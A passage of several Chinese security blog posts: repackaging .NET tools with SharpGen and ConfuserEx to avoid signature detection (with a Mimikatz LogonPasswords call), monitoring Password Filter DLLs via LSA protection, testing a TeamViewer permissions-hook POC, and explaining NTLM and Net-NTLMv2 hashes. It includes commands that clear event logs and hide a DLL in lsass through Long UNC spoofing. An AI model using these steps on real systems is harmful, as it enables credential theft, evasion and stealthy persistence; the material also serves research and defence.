<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Source\SharpWMI\Program.cs(3,14): error CS0234: The type or namespace name 'Management' does not exist in the namespace 'System' (are you missing an assembly reference?)
</code></pre></div></div>

<p>(3)修改SharpWMI的源代码</p>

<p>只保留Program.cs，删除其中的Main函数并且将Program.cs中的每个静态方法改为公共方法</p>

<p>例如：</p>

<p><code class="language-plaintext highlighter-rouge">static void LocalWMIQuery(string wmiQuery, string wmiNameSpace = "")</code>需要修改为<code class="language-plaintext highlighter-rouge">public static void LocalWMIQuery(string wmiQuery, string wmiNameSpace = "")</code></p>

<p>(4)重新编译SharpGen</p>

<p>命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dotnet build --configuration Release
</code></pre></div></div>

<p>(5)调用测试</p>

<p>example.txt的功能为调用SharpWMI中的<code class="language-plaintext highlighter-rouge">LocalWMIQuery</code>方法查询<code class="language-plaintext highlighter-rouge">win32_ComputerSystem</code>，内容如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SharpWMI.Program.LocalWMIQuery("select * from win32_ComputerSystem");
Console.WriteLine(Host.GetProcessList());
</code></pre></div></div>

<p>SharpGen的命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dotnet bin/Release/netcoreapp2.1/SharpGen.dll -f example.exe --source-file example.txt
</code></pre></div></div>

<p>生成example.ex并执行，调用成功，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-10-17/2-3.png" alt="Alt text"></p>

<h4 id="2添加自己编写的c模板">2.添加自己编写的C#模板</h4>

<p>命名为SharpTest，功能为接收参数并在命令行输出</p>

<p>(1)新建文件夹SharpTest，其中新建文件Program.cs，内容如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>using System;
using System.Collections.Generic;
using System.Management;
namespace SharpTest
{
    class Program
    {
        public static void TestMethod(string string1)
        {
            Console.WriteLine(string1);
        }
    }
}
</code></pre></div></div>

<p>(2)修改SharpGen/SharpGen.csproj</p>

<p>ItemGroup标签中添加<code class="language-plaintext highlighter-rouge">&lt;Compile Remove="Source\SharpTest\Program.cs" /&gt;</code></p>

<p>(3)重新编译SharpGen</p>

<p>命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dotnet build --configuration Release
</code></pre></div></div>

<p>(4)调用测试</p>

<p>example.txt的功能为调用SharpTest中的TestMethod方法，参数为<code class="language-plaintext highlighter-rouge">123456</code>，内容如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SharpTest.Program.TestMethod("123456");
</code></pre></div></div>

<p>SharpGen的命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dotnet bin/Release/netcoreapp2.1/SharpGen.dll -f example.exe --source-file example.txt
</code></pre></div></div>

<p>生成example.exe并执行，调用成功，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-10-17/2-4.png" alt="Alt text"></p>

<p>为了便于测试，我已经fork了cobbr的SharpGen，添加了对SharpWMI和SharpTest的调用，地址如下：</p>

<p>https://github.com/3gstudent/SharpGen</p>

<h3 id="3资源保护">3.资源保护</h3>

<p>使用新版的ConfuserEx能够对编译后的文件资源进行保护，地址如下：</p>

<p>https://github.com/mkaring/ConfuserEx</p>

<p>旧版的ConfuserEx不再进行维护，地址如下：</p>

<p>https://github.com/yck1509/ConfuserEx</p>

<p>调用命令示例：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dotnet bin/Release/netcoreapp2.1/SharpGen.dll -f example.exe --confuse confuse.cr "Console.WriteLine(Mimikatz.LogonPasswords());"
</code></pre></div></div>

<p>对应使用的配置文件为<code class="language-plaintext highlighter-rouge">SharpGen/confuse.cr</code></p>

<p>默认配置为对资源执行加密和LZMA压缩</p>

<p>ConfuserEx还支持其他保护功能：</p>

<ul>
  <li>Anti Debug Protection</li>
  <li>Anti Dump Protection</li>
  <li>Anti IL Dasm Protection</li>
  <li>Anti Tamper Protection</li>
  <li>Constants Protection</li>
  <li>Control Flow Protection</li>
  <li>Invalid Metadata Protection</li>
  <li>Name Protection</li>
  <li>Reference Proxy Protection</li>
  <li>Resources Protection</li>
</ul>

<p>只需要去掉<code class="language-plaintext highlighter-rouge">SharpGen/confuse.cr</code>中对应的注释即可</p>

<p>例如添加<code class="language-plaintext highlighter-rouge">anti debug</code>功能，配置文件confuse.cr的内容如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;project baseDir="{0}" outputDir="{1}" xmlns="http://confuser.codeplex.com"&gt;
    &lt;module path="{2}"&gt;
      &lt;rule pattern="true" inherit="false"&gt;
         &lt;!-- &lt;protection id="anti debug" /&gt;       --&gt;
         &lt;!-- &lt;protection id="anti dump" /&gt;        --&gt;
         &lt;!-- &lt;protection id="anti ildasm" /&gt;      --&gt;
         &lt;!-- &lt;protection id="anti tamper" /&gt;      --&gt;
         &lt;!-- &lt;protection id="constants" /&gt;        --&gt;
         &lt;!-- &lt;protection id="ctrl flow" /&gt;        --&gt;
         &lt;!-- &lt;protection id="invalid metadata" /&gt; --&gt;
         &lt;!-- &lt;protection id="ref proxy" /&gt;        --&gt;
         &lt;!-- &lt;protection id="rename" /&gt;           --&gt;
         &lt;protection id="resources" /&gt;
         &lt;protection id="anti debug" /&gt;
      &lt;/rule&gt;
    &lt;/module&gt;
&lt;/project&gt;
</code></pre></div></div>

<h3 id="4补充禁用优化">4.补充：禁用优化</h3>

<p>SharpGen在编译期间会对源代码进行优化，可通过<code class="language-plaintext highlighter-rouge">--no-optimization</code>参数来禁用优化，这将导致增加生成文件的大小</p>

<h2 id="0x05-利用分析">0x05 利用分析</h2>
<hr>

<p>SharpGen可以作为.Net程序集重新包装的平台，具有如下优点：</p>

<ul>
  <li>使用.NET Core平台和Roslyn进行动态编译，开发代码时可选择多平台(Linux，MacOS和Windows)</li>
  <li>可调用其他开源库，实现功能的定制，最后将其封装成单独的一个exe文件或dll文件</li>
  <li>使用ConfuserEx对资源进行加密和压缩，避免对特征码的检测</li>
  <li>生成的文件支持.Net3.5和.Net 4.0</li>
  <li>生成的文件支持x86和x64</li>
</ul>

<p>更进一步，使用SharpGen能够快速的将.Net程序集形式的POC转换成EXP</p>

<h2 id="0x06-小结">0x06 小结</h2>
<hr>

<p>本文介绍了SharpGen的功能，分享了我实现调用其他开源库的方法，分析SharpGen的优点。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on October 17, 2019
  </div>

  
</article><article class="post">
  <h1>配置Additional LSA Protection监控Password Filter DLL</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>针对文章<a href="https://3gstudent.github.io/3gstudent.github.io/Password-Filter-DLL%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/">《Password Filter DLL在渗透测试中的应用》</a>中wyzzoo的回复,提醒注意高版本系统上考虑的问题,地址如下:</p>

<p>https://github.com/3gstudent/feedback/issues/13#issuecomment-371694931</p>

<p>于是我对这部分内容进行研究,整理成文</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容:</p>

<ul>
  <li>如何配置额外的LSA保护</li>
  <li>如何获得监控结果</li>
  <li>补充一个Password Filter DLL的利用思路</li>
  <li>利用Additional LSA Protection的检测效果</li>
</ul>

<h2 id="0x02-配置额外的lsa保护">0x02 配置额外的LSA保护</h2>
<hr>

<p>参考官方文档:</p>

<p>https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection</p>

<p>Windows8.1系统开始,为LSA提供了额外的保护,以防止由未受保护的进程读取内存和代码注入</p>

<h3 id="保护方法">保护方法:</h3>

<p>要求加载到LSA的任何插件都使用Microsoft签名进行数字签名</p>

<p>具体的说,数字签名指的是catalog签名，签名需要满足WHQL认证</p>

<p>参考资料：</p>

<p>https://docs.microsoft.com/zh-cn/windows-hardware/drivers/install/whql-release-signature</p>

<p>关于catalog签名有过文章介绍:<a href="https://3gstudent.github.io/3gstudent.github.io/CAT%E6%96%87%E4%BB%B6%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/">《CAT文件数字签名使用技巧》</a></p>

<p>测试系统： Win8.1 x64</p>

<h3 id="配置方法">配置方法:</h3>

<h4 id="1操作系统需要满足条件">1、操作系统需要满足条件:</h4>

<p>Win8.1或者更新的系统</p>

<h4 id="2修改注册表">2、修改注册表</h4>

<p>注册表位置<code class="language-plaintext highlighter-rouge">HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\LSASS.exe</code>，新建DWORD项<code class="language-plaintext highlighter-rouge">AuditLevel</code>，值为<code class="language-plaintext highlighter-rouge">00000008</code></p>

<p>对应cmd命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\LSASS.exe" /v "AuditLevel" /t REG_DWORD /d "00000008" /f
</code></pre></div></div>

<h4 id="3重启系统">3、重启系统</h4>

<h2 id="0x03-获得监控结果">0x03 获得监控结果</h2>
<hr>

<p>查看日志Event 3065和Event 3066</p>

<p>Event 3065：此事件记录代码完整性检查确定进程（通常是lsass.exe）试图加载不符合共享段的安全要求的特定驱动程序。但是，由于设置了系统策略，图像被允许加载。</p>

<p>Event 3066：此事件记录代码完整性检查确定进程（通常是lsass.exe）试图加载不符合Microsoft签名级别要求的特定驱动程序。但是，由于设置了系统策略，图像被允许加载。</p>

<p>位置：<code class="language-plaintext highlighter-rouge">Applications and Services Logs\Microsoft\Windows\CodeIntegrity</code></p>

<p>能够记录不符合条件的dll，但并未阻止加载dll，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-3-12/2-1.png" alt="Alt text"></p>

<p>通过命令行查询日志Event 3065和Event 3066：</p>

<p>获取日志分类列表：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wevtutil el &gt;1.txt
</code></pre></div></div>

<p>找到<code class="language-plaintext highlighter-rouge">CodeIntegrity</code>对应的为<code class="language-plaintext highlighter-rouge">Microsoft-Windows-CodeIntegrity/Operational</code></p>

<p>查找Event 3065和Event 3066：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wevtutil qe Microsoft-Windows-CodeIntegrity/Operational /rd:true /f:text /q:"*[system/eventid=3065 and 3066]"
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-3-12/2-2.png" alt="Alt text"></p>

<p><strong>补充：</strong></p>

<p>删除日志CodeIntegrity：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wevtutil cl "Microsoft-Windows-CodeIntegrity/Operational"
</code></pre></div></div>

<h2 id="0x04-补充一个password-filter-dll的利用思路利用long-unc文件名欺骗实现dll的隐藏">0x04 补充一个Password Filter DLL的利用思路——利用Long UNC文件名欺骗实现DLL的“隐藏”</h2>
<hr>

<p>具体隐藏细节可参考文章<a href="https://3gstudent.github.io/3gstudent.github.io/Catalog%E7%AD%BE%E5%90%8D%E4%BC%AA%E9%80%A0-Long-UNC%E6%96%87%E4%BB%B6%E5%90%8D%E6%AC%BA%E9%AA%97/">《Catalog签名伪造——Long UNC文件名欺骗》</a></p>

<h3 id="1将dll命名为long-unc文件名格式保存在windirsystem32下">1、将dll命名为Long UNC文件名格式，保存在<code class="language-plaintext highlighter-rouge">%windir%\system32\</code>下</h3>

<p>lsass.exe进程默认加载scecli.dll，所以选择将dll伪装成scecli.dll</p>

<p>命令行：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>type Win32Project3.dll &gt; "\\?\C:\windows\system32\scecli.dll "
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>scecli.dll名称后面有一个空格</p>

<h3 id="2获得该dll的短文件名">2、获得该dll的短文件名</h3>

<p>命令行：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dir /x scecli*.dll
</code></pre></div></div>

<p>获得短文件名<code class="language-plaintext highlighter-rouge">SCECLI~1.DLL</code>，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-3-12/3-1.png" alt="Alt text"></p>

<h3 id="3修改注册表键值">3、修改注册表键值</h3>

<p>读取键值：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>REG QUERY "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Notification Packages"
</code></pre></div></div>

<p>添加dll：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Notification Packages" /t REG_MULTI_SZ /d "scecli\0SCECLI~1.DLL" /f
</code></pre></div></div>

<h3 id="4重启">4、重启</h3>

<p>使用Process Explorer查看lsass进程加载的dll</p>

<p>显示加载两个同样的scecli.dll，具体属性存在差别，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-3-12/3-2.png" alt="Alt text"></p>

<h3 id="5检测">5、检测</h3>

<p>Event 3066成功检测，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-3-12/3-3.png" alt="Alt text"></p>

<h2 id="0x05-补充">0x05 补充</h2>
<hr>

<p>1、为Password Filter DLL添加一个伪造的微软Authenticode签名，并且修改证书验证机制使其生效，仍无法绕过Additional LSA Protection的监控，因为Password Filter DLL需要合法的catalog签名，而不是Authenticode签名</p>

<p>2、自己为Password Filter DLL制作一个catalog签名并将其添加到系统的安全编录数据库中，仍无法绕过Additional LSA Protection的监控</p>

<h2 id="0x06-小结">0x06 小结</h2>
<hr>

<p>本文介绍了配置Additional LSA Protection监控Password Filter DLL的方法和检测效果，如果Password Filter DLL未获得合法的catalog签名，系统能绕成功检测，但默认不会阻止加载</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on March 12, 2018
  </div>

  
</article><article class="post">
  <h1>TeamViewer 13.0.5058中的权限漏洞测试</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>12月5日，TeamViewer发布新版本<code class="language-plaintext highlighter-rouge">13.0.5640</code>，修复了之前版本<code class="language-plaintext highlighter-rouge">13.0.5058</code>中的一个bug。</p>

<p>随后，gellin在github上传了该漏洞的POC，安全信息网站ThreatPost对这个情况作了报道。</p>

<p>但一眼看上去，该漏洞的描述和POC较难理解，于是，本文对其做了进一步测试，验证POC，得出结论</p>

<p>POC:</p>

<p>https://github.com/gellin/TeamViewer_Permissions_Hook_V1</p>

<p>ThreatPost报道：</p>

<p>https://threatpost.com/teamviewer-rushes-fix-for-permissions-bug/129096/</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>POC测试</li>
  <li>原理简要分析</li>
  <li>利用思路</li>
  <li>防御</li>
</ul>

<h2 id="0x02-poc测试">0x02 POC测试</h2>
<hr>

<h3 id="1编译生成dll">1、编译生成dll</h3>

<p>POC通过c++开发，在使用VS2012对其编译时会出现如下bug：</p>

<blockquote>
  <p>error C2784: “std::_String_iterator<_mystr> std::operator +(_String_iterator<_mystr>::difference_type,std::_String_iterator<_mystr>)”:未能从“std::string”为“std::_String_iterator<_mystr>”推导 模板 参数</_mystr></_mystr></_mystr></_mystr></p>
</blockquote>

<p>bug出现的位置：</p>

<p>https://github.com/gellin/TeamViewer_Permissions_Hook_V1/blob/master/TeamViewerHook_13_0_3711_88039/main.cpp#L25</p>

<p>Bug出现的原因是作者使用更高版本的Visual Studio编写，况且这段代码的功能是输出，所以可以忽略，修改后的代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>console = new Console(std::string(BANNER), std::string("TeamViewer Permissions Hook v1"));
</code></pre></div></div>

<p>编译成功，生成TeamViewerHook_13_0_3711_88039.dll</p>

<h3 id="2测试环境搭建">2、测试环境搭建</h3>

<p><strong>主机1(Server)：</strong></p>

<p>操作系统：Win8 x86</p>

<p>安装TeamViewer 13.0.5058</p>

<p>作为被控制端，ID为543 847 147，密码为49s4eb</p>

<p><strong>主机2(Client)：</strong></p>

<p>操作系统：Win8 x86</p>

<p>安装TeamViewer 13.0.5058</p>

<p>作为控制端，用于远程连接主机1</p>

<h3 id="3测试功能a-主机1server反控主机2client">3、测试功能A： 主机1(Server)反控主机2(Client)</h3>

<p>主机2(Client)填入ID和密码，成功远程连接主机1(Server)</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-12-11/2-1.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>TeamViewer支持的一个正常功能： 主机2(Client)选择<code class="language-plaintext highlighter-rouge">通信</code>-<code class="language-plaintext highlighter-rouge">与伙伴切换角色控制</code>，能够切换角色，允许主机1(Server)反过来控制主机2(Client)，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-12-11/2-2.png" alt="Alt text"></p>

<p>POC的第一个功能： <code class="language-plaintext highlighter-rouge">实现主机1(Server)未经授权，反过来控制主机2(Client)</code></p>

<p><strong>流程如下：</strong></p>

<p>在主机1(Server)上，将TeamViewerHook_13_0_3711_88039.dll注入到TeamViewer的进程</p>

<p>这里可使用APC注入，代码可参考：</p>

<p>https://github.com/3gstudent/Inject-dll-by-APC/blob/master/test.cpp</p>

<p>dll注入前，主机1(Server)单击会话列表，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-12-11/2-3.png" alt="Alt text"></p>

<p>下面进行dll注入，按照提示输入<code class="language-plaintext highlighter-rouge">NUMPAD 1</code>，选择<code class="language-plaintext highlighter-rouge">Host/Server</code>，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-12-11/2-4.png" alt="Alt text"></p>

<p>再次单击主机1(Server)的会话列表，列表被修改，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-12-11/2-5.png" alt="Alt text"></p>

<p>选中<code class="language-plaintext highlighter-rouge">切换角色</code>，即可实现主机1(Server)反过来控制主机2(Client)</p>

<h3 id="4测试功能b-主机2client解锁鼠标键盘">4、测试功能B： 主机2(Client)解锁鼠标键盘</h3>

<p>同测试A，主机2(Client)填入ID和密码，成功远程连接主机1(Server)</p>

<p>主机1(Server)通过设置会话列表，禁止主机2(Client)的鼠标进行远程控制，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-12-11/2-6.png" alt="Alt text"></p>

<p>正常情况下，主机2(Client)无法使用鼠标对主机1(Server)进行远程控制</p>

<p>POC的第二个功能： <code class="language-plaintext highlighter-rouge">实现主机2(Server)未经授权，解锁鼠标，远程控制主机1(Server)</code></p>

<p>下面进行dll注入，按照提示输入<code class="language-plaintext highlighter-rouge">NUMPAD 2</code>，选择<code class="language-plaintext highlighter-rouge">client</code>，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-12-11/2-7.png" alt="Alt text"></p>

<p>成功解锁鼠标，远程控制主机1(Server)，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-12-11/2-8.png" alt="Alt text"></p>

<h2 id="0x03-原理简要分析">0x03 原理简要分析</h2>
<hr>

<p>通过dll注入，搜索目标进程的内存，找到代表权限的指针地址，重新赋值，进行naked inline hook，实现权限的修改</p>

<p>修改后的内存结构如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-12-11/3-1.png" alt="Alt text"></p>

<p>具体的实现方法可参照源代码</p>

<h1 id="0x04-利用思路">0x04 利用思路</h1>
<hr>

<h3 id="1功能a-主机1server反控主机2client">1、功能A： 主机1(Server)反控主机2(Client)</h3>

<p>如果主机1(Server)通过漏洞成功反控主机2(Client)，默认情况下，主机2(Client)的桌面会显示成被控制的状态</p>

<p>但是，既然通过dll注入能够修改TeamViewer进程的内存数据，那么也能够通过修改内存数据控制主机2(Client)的桌面显示内容(例如黑屏、正常屏幕(不推荐)等)</p>

<p>公开的POC未实现控制主机2(Client)桌面显示内容的功能，考虑到这个漏洞的危害，本文不会介绍POC转为EXP的具体方法</p>

<h3 id="2功能b-主机2client解锁鼠标键盘">2、功能B： 主机2(Client)解锁鼠标键盘</h3>

<p>利用前提为主机2(Client)已经成功远程连接主机1(Server)，当主机1(Server)选择禁用主机2(Client)的鼠标时，该功能才会发挥作用</p>

<h2 id="0x05-防御思路">0x05 防御思路</h2>
<hr>

<p>1、建议用户升级TeamViewer新版本<code class="language-plaintext highlighter-rouge">13.0.5640</code></p>

<p><strong>注：</strong></p>

<p>截止本文编写，TeamViewer官网尚未发布该升级版本的具体内容，地址如下：</p>

<p>https://www.teamviewer.com/en/download/changelog/</p>

<p>2、不要随意连接未知的TeamViewer服务器</p>

<h2 id="0x06-小结">0x06 小结</h2>
<hr>

<p>本文对TeamViewer 13.0.5058中的权限漏洞POC进行测试，简要介绍原理和利用思路，给出防御建议</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on December 11, 2017
  </div>

  
</article><article class="post">
  <h1>Windows下的密码hash——NTLM hash和Net-NTLM hash介绍</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在Windows系统中，比较常见是从系统导出来的NTLM hash，通过Hashcat能够破解出明文密码。</p>

<p>Hashcat支持超过200种高度优化的hash算法，其中和NTLM hash相关的有4个，分别为<code class="language-plaintext highlighter-rouge">NetNTLMv1</code>、<code class="language-plaintext highlighter-rouge">NetNTLMv1+ESS</code>、<code class="language-plaintext highlighter-rouge">NetNTLMv2</code>和<code class="language-plaintext highlighter-rouge">NTLM</code>。</p>

<p>NetNTLM具体是什么呢？又是如何获得的呢？本文受到byt3bl33d3r文章的启发，下面将结合自己的心得，介绍这部分内容</p>

<p>学习链接：</p>

<p>https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<ul>
  <li>NTLM hash和Net-NTLM hash区别</li>
  <li>NTLM hash的加密方法</li>
  <li>Net-NTLM hash的破解</li>
</ul>

<h2 id="0x02-ntlm-hash">0x02 NTLM hash</h2>
<hr>

<p>通常是指Windows系统下Security Account Manager中保存的用户密码hash</p>

<p>该hash的生成方法：</p>

<ol>
  <li>将明文口令转换成十六进制的格式</li>
  <li>转换成Unicode格式，即在每个字节之后添加0x00</li>
  <li>对Unicode字符串作MD4加密，生成32位的十六进制数字串</li>
</ol>

<p><strong>实际测试：</strong></p>

<p>用户密码为<code class="language-plaintext highlighter-rouge">test123</code></p>

<p>转换成十六进制的格式为<code class="language-plaintext highlighter-rouge">74657374313233</code></p>

<p>转换成Unicode格式为<code class="language-plaintext highlighter-rouge">7400650073007400310032003300</code></p>

<p>对字符串<code class="language-plaintext highlighter-rouge">7400650073007400310032003300</code>作MD4加密，结果为<code class="language-plaintext highlighter-rouge">c5a237b7e9d8e708d8436b6148a25fa1</code></p>

<p><strong>注：</strong></p>

<p>MD4加密可使用工具HashCalc，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-11/2-1.png" alt="Alt text"></p>

<p>下面使用mimikatz导出用户密码的hash，对比进行验证，结果相同，验证成功，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-11/2-2.png" alt="Alt text"></p>

<p>在渗透测试中，通常可从Windows系统中的SAM文件和域控的NTDS.dit文件中获得所有用户的hash，通过Mimikatz读取lsass.exe进程能获得已登录用户的NTLM hash</p>

<p><strong>补充：</strong></p>

<p>Windows Vista和Windows Server 2008以前的系统还会使用LM hash</p>

<p>LM hash的生成方法本文暂不介绍</p>

<p>自Windows Vista和Windows Server 2008开始,Windows取消LM hash</p>

<p>但某些工具的参数需要填写固定格式<code class="language-plaintext highlighter-rouge">LM hash:NT hash</code>，可以将LM hash填0(LM hash可以为任意值)，即<code class="language-plaintext highlighter-rouge">00000000000000000000000000000000:NT hash</code></p>

<h2 id="0x03-net-ntlm-hash">0x03 Net-NTLM hash</h2>
<hr>

<p>通常是指网络环境下NTLM认证中的hash</p>

<p>NTLM认证采用质询/应答（Challenge/Response）的消息交换模式，流程如下：</p>

<ol>
  <li>
    <p>客户端向服务器发送一个请求，请求中包含明文的登录用户名。服务器会提前存储登录用户名和对应的密码hash</p>
  </li>
  <li>
    <p>服务器接收到请求后，生成一个16位的随机数(这个随机数被称为Challenge),明文发送回客户端。使用存储的登录用户密码hash加密Challenge，获得Challenge1</p>
  </li>
  <li>
    <p>客户端接收到Challenge后，使用登录用户的密码hash对Challenge加密，获得Challenge2(这个结果被称为response)，将response发送给服务器</p>
  </li>
  <li>
    <p>服务器接收客户端加密后的response，比较Challenge1和response，如果相同，验证成功</p>
  </li>
</ol>

<p>在以上流程中，登录用户的密码hash即<code class="language-plaintext highlighter-rouge">NTLM hash</code>，response中包含<code class="language-plaintext highlighter-rouge">Net-NTLM hash</code></p>

<p>更多NTLM认证的资料可参考：</p>

<p>http://davenport.sourceforge.net/ntlm.html</p>

<p>在NTLM认证中，NTLM响应分为NTLM v1，NTLMv2，NTLM session v2三种协议，不同协议使用不同格式的Challenge和加密算法</p>

<p>所以也就存在不同协议的Net-NTLM hash，即Net-NTLM v1 hash，Net-NTLM v2 hash</p>

<p><strong>实际测试：</strong></p>

<p>服务器：</p>

<ul>
  <li>IP： 192.168.62.139</li>
  <li>登录用户名： a</li>
  <li>登录密码： test123</li>
</ul>

<p>客户端：</p>

<ul>
  <li>IP： 192.168.62.130</li>
</ul>

<p>客户端通过命令行远程连接服务器，命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net use \\192.168.52.139 /u:a test123
</code></pre></div></div>

<p>同时，客户端运行Wireshark，捕获数据包，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-11/2-3.png" alt="Alt text"></p>

<p>前四个数据包对应NTLM认证的四个步骤</p>

<p>查看第二个数据包，获得Challenge，为<code class="language-plaintext highlighter-rouge">c0b5429111f9c5f4</code>，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-11/2-4.png" alt="Alt text"></p>

<p>查看第三个数据包，获得客户端加密后的Challenge，为<code class="language-plaintext highlighter-rouge">a9134eee81ca25de</code>，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-11/2-5.png" alt="Alt text"></p>

<p>Response数据为<code class="language-plaintext highlighter-rouge">a5f1c47844e5b3b9c6f67736a2e1916d:0101000000000000669dae86ba8bd301a9134eee81ca25de0000000002001e00570049004e002d003100550041004200430047004200470049005500330001001e00570049004e002d003100550041004200430047004200470049005500330004001e00570049004e002d003100550041004200430047004200470049005500330003001e00570049004e002d003100550041004200430047004200470049005500330007000800669dae86ba8bd30106000400020000000800300030000000000000000000000000300000e9d9e613613097d1e2f47c1fd97fa099f65dfd78075d8bdb5ca162492ea5d2990a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00360032002e00310033003900000000000000000000000000</code>，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-11/2-6.png" alt="Alt text"></p>

<p>下面，使用Hashcat对该Net-NTLM hash进行破解</p>

<p>NTLMv2的格式为：</p>

<p><code class="language-plaintext highlighter-rouge">username::domain:challenge:HMAC-MD5:blob</code></p>

<p><strong>注：</strong></p>

<p>challenge为NTLM Server Challenge，domian由数据包内容获得(IP或者机器名)</p>

<p>HMAC-MD5对应数据包中的NTProofStr，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-11/2-7.png" alt="Alt text"></p>

<p>blob对应数据包中Response去掉NTProofStr的后半部分</p>

<p>因此，完整的NTLMv2数据如下：</p>

<p><code class="language-plaintext highlighter-rouge">a::192.168.62.139:c0b5429111f9c5f4:a5f1c47844e5b3b9c6f67736a2e1916d:0101000000000000669dae86ba8bd301a9134eee81ca25de0000000002001e00570049004e002d003100550041004200430047004200470049005500330001001e00570049004e002d003100550041004200430047004200470049005500330004001e00570049004e002d003100550041004200430047004200470049005500330003001e00570049004e002d003100550041004200430047004200470049005500330007000800669dae86ba8bd30106000400020000000800300030000000000000000000000000300000e9d9e613613097d1e2f47c1fd97fa099f65dfd78075d8bdb5ca162492ea5d2990a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00360032002e00310033003900000000000000000000000000</code></p>

<p>为便于测试，新建字典文件，字典内容为<code class="language-plaintext highlighter-rouge">test123</code></p>

<p>Hashcat参数如下：</p>

